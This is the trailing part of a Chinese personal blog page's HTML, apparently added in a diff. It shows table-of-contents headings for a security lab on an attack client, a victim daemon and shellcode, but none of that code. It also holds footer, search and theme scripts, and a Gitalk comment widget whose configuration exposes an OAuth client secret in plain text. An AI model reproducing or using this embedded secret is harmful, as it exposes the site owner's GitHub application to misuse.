密钥管理机制和传输加密方案</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#客户端（攻击方）代码"><span class="nav-text">客户端（攻击方）代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端（daemon）代码"><span class="nav-text">服务端（daemon）代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-用-wireshark-等工具抓取传输内容，证明未加密与加密的区别"><span class="nav-text">4.2 用 wireshark 等工具抓取传输内容，证明未加密与加密的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-分析密钥管理和传输加密方案的安全性"><span class="nav-text">4.3 分析密钥管理和传输加密方案的安全性</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#五、Shellcode介绍"><span class="nav-text">五、Shellcode介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-创建-学号-txt"><span class="nav-text">5.1 创建 学号.txt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-下载-daemon程序"><span class="nav-text">5.2 下载 daemon程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-3-运行daemon程序"><span class="nav-text">5.3 运行daemon程序</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#六、任务二、三总体代码"><span class="nav-text">六、任务二、三总体代码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6-1-字符串翻转服务端程序-server-c"><span class="nav-text">6.1 字符串翻转服务端程序 server.c</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-2-恶意客户端程序-attack-py"><span class="nav-text">6.2 恶意客户端程序 attack.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-3-daemon服务端（受害方）程序-daemonl-py"><span class="nav-text">6.3 daemon服务端（受害方）程序 daemonl.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-4-daemon客户端（攻击方）程序-client-py"><span class="nav-text">6.4 daemon客户端（攻击方）程序 client.py</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ColaLinN</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数&#58;</span>
+    
+    <span title="站点总字数">86k</span>
+  
+</div>
+
+
+
+
+
+
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人访问
+</span>
+</div>
+
+
+
+<!--添加网站的运行时间-->
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+		var t1 = Date.UTC(2020,01,15,19,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已安全运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+	siteTime();
+</script>
+
+<div class="BbeiAn-info">
+   	  
+    <a target="_blank" href="http://www.beian.miit.gov.cn/" rel="nofollow">琼ICP备-20002422号</a> <!--a标签中增加nofollow属性，避免爬虫出站。-->| 
+	<span style="padding-left:25px;background:url(/images/beian.png) no-repeat left center" rel="nofollow">
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=46902402000039" style="text-decoration:none;no-repeat left center" rel="nofollow">琼公网安备46902402000039号</a>	  <!--这里将图标作为了背景，以使得能和后面的文字在同一行-->
+</div>
+<!--*style="color:#f0d784"-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '7dd0e4dd1112b4f6ac75',
+          clientSecret: '5f52c7a06abafb34741cd6468191b708c1f166b9',
+          repo: 'ColaLinN.github.io',
+          owner: 'ColaLinN',
+          admin: ['ColaLinN'],
+          id: location.pathname,
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+</body>
+</html>
